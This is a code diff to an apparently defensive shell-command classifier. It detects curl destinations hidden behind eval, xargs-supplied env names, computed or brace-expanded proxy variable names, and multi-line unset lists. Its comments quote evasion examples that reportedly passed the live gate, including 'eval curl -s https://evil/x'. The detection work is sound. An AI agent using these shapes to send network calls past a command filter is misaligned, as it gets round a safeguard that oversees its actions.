@@ -294,6 +294,9 @@ const PREFIX_POSITIONALS = { timeout: 1, gtimeout: 1 }
 // the prefix commands' own options and arguments are skipped.
 export function commandIndex(mw) {
   let i = 0
+  // xargs's replace string (`-I{}`, `-i`, `--replace`): an env operand holding it is an assignment
+  // xargs fills from stdin (`xargs -I{} env {} curl`), not the command (didi 36059)
+  let repl = null
   while (i < mw.length) {
     if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
     // A function definition's head: its body is a command line, run when the name is called.
@@ -314,7 +317,14 @@ export function commandIndex(mw) {
     while (i < mw.length) {
       const a = mw[i]
       if (a === '--') { i++; break }
+      if (p === 'xargs') {
+        if (a === '-I') repl = mw[i + 1] ?? null
+        else if (/^-I./.test(a)) repl = a.slice(2)
+        else if (a === '-i' || a === '--replace') repl = '{}'
+        else if (/^(?:-i|--replace=)./.test(a)) repl = a.replace(/^(?:-i|--replace=)/, '')
+      }
       if (a.startsWith('-') && a.length > 1) { i += withValue.has(a) ? 2 : 1; continue }
+      if (p === 'env' && repl && a.includes(repl)) { i++; continue }
       // env takes ANY word holding `=` as an assignment, not only a NAME=: `env 'BASH_FUNC_echo%%=...'
       // curl ...` ran curl, and the word read as the command hid it (dexter, c8b1ccbf round 7)
       if (p === 'env' && /^[^=]+=/.test(a)) { i++; continue }
@@ -800,11 +810,26 @@ const CURLRC = /curlrc|CURL_HOME|XDG_CONFIG_HOME/
 // shows. `no_proxy` only narrows where a proxy is used.
 const PROXY_ENV = /(?:^|[^A-Za-z0-9_])(?!no_proxy)[A-Za-z0-9]*_proxy(?![A-Za-z0-9_])/i
 // Taking a proxy variable away (`unset http_proxy`, `env -u HTTPS_PROXY`) points curl nowhere new.
-const PROXY_REMOVED = /(?:^|[\s;&|(])(?:unset(?:\s+-[fv])?(?:\s+[A-Za-z0-9_]+)+|env(?:\s+(?:-u\s*|--unset[=\s])[A-Za-z0-9_]+)+)/g
+// The name list ends with its own command: blanks only, never a newline (`unset x` + newline +
+// `export http_proxy=...` let the list swallow the next command's proxy name, didi 36059).
+const PROXY_REMOVED = /(?:^|[\s;&|(])(?:unset(?:[ \t]+-[fv])?(?:[ \t]+[A-Za-z0-9_]+)+|env(?:[ \t]+(?:-u[ \t]*|--unset[= \t])[A-Za-z0-9_]+)+)/g
 // A variable whose NAME is computed (`export ${v}proxy=...`, `env "$n=..." curl`, `declare -x "${p}=..."`,
 // `printf -v "$n" ...`): which variable it sets is not read, and a proxy one points curl elsewhere
-// (didi 36034, measured live). On a curl line it is an unknown destination.
-const COMPUTED_ENV_NAME = /(?:^|[\s;&|(])(?:(?:export|declare|typeset|readonly|local|env)(?:\s+-\w+)*(?:\s+[^\s=;&|]+=\S*)*\s+[^\s=;&|]*[$`][^\s=;&|]*=|printf\s+-v\s*[^\s;&|]*[$`])/
+// (didi 36034, measured live). On a curl line it is an unknown destination. A brace in the name
+// (`export http_{proxy,x}=`) expands to several names, `--` ends the options, `eval` builds the
+// assignment at run time (didi 36059).
+const COMPUTED_ENV_NAME = /(?:^|[\s;&|(])(?:(?:export|declare|typeset|readonly|local|env|eval)(?:\s+-[\w-]*)*(?:\s+[^\s=;&|]+=\S*)*\s+[^\s=;&|]*[$`{][^\s=;&|]*=|printf\s+-v\s*[^\s;&|]*[$`])/
+// `xargs -I R ... env ...R...`: the variable env sets is named by stdin, whatever R is.
+const XARGS_ENV_NAME = /\bxargs\b[^;&|\n]*?(?:-I\s*(\S+)|-i(\S*)|--replace(?:=(\S+))?)[^;&|\n]*?\benv\b([^;&|\n]*)/
+function xargsNamesEnv(text) {
+  const m = XARGS_ENV_NAME.exec(text)
+  if (!m) return false
+  const r = m[1] ?? (m[2] || m[3] || '{}')
+  return m[4].split(/\s+/).some((w) => w.includes(r))
+}
+// A substitution inside a name may hold blanks (`export \`printf http_\`proxy=`): each one is
+// folded to a bare `$S` first, so the name test sees one word.
+const foldSubstitutions = (text) => text.replace(/`[^`]*`/g, '$S').replace(/\$\([^()]*\)/g, '$S')
 // `ctx`: { unread: names written unread (unreadNames), text: the whole command, arrays: collectArrays }.
 export function curlDestinations(args, inners = null, fileValues = null, ctx = null) {
   const dests = []
@@ -817,7 +842,7 @@ export function curlDestinations(args, inners = null, fileValues = null, ctx = n
   const said = ctx?.text ? String(ctx.text).replace(/['"\\]/g, '') : ''
   if (CURLRC.test(said)) dests.push('<curlrc>')
   if (PROXY_ENV.test(said.replace(PROXY_REMOVED, ' '))) dests.push('<proxy variable>')
-  if (COMPUTED_ENV_NAME.test(said)) dests.push('<computed variable name>')
+  if (COMPUTED_ENV_NAME.test(foldSubstitutions(said)) || xargsNamesEnv(said)) dests.push('<computed variable name>')
   const unreadVar = (part) => {
     if (!ctx?.unread?.size) return false
     for (const m of part.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (ctx.unread.has(m[1])) return true
@@ -1554,6 +1579,19 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       // xargs before the command: its arguments come from stdin, which the argv reading below never
       // sees (`echo URL | xargs curl`, `xargs curl <<< URL`; card c8b1ccbf, shape 3).
       const viaXargs = sw.slice(0, commandIndex(sw)).some((w) => normalizedName(w) === 'xargs')
+      // `eval WORDS`: the words, joined, are a command line run here (`eval curl -s https://evil/x`
+      // passed the live gate: the command word read was eval; dexter, d6b95892 round 4).
+      if (cmd === 'eval') {
+        const argv = shellWords(text)
+        const at = argv.findIndex((w) => normalizedName(w) === 'eval')
+        const body = argv.slice(at + 1).join(' ')
+        if (!body.trim()) continue
+        const r = depth < 4
+          ? classify(body, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
+          : unreadableVerdict(body, vendorHosts, vendorDomains)
+        if (r.deny) return { ...r, reason: `eval-${r.reason}` }
+        continue
+      }
       // `bash -c BODY`: the body is a command line, judged in full (card c8b1ccbf, shape 2).
       if (SHELL.test(cmd)) {
         const argv = shellWords(text)
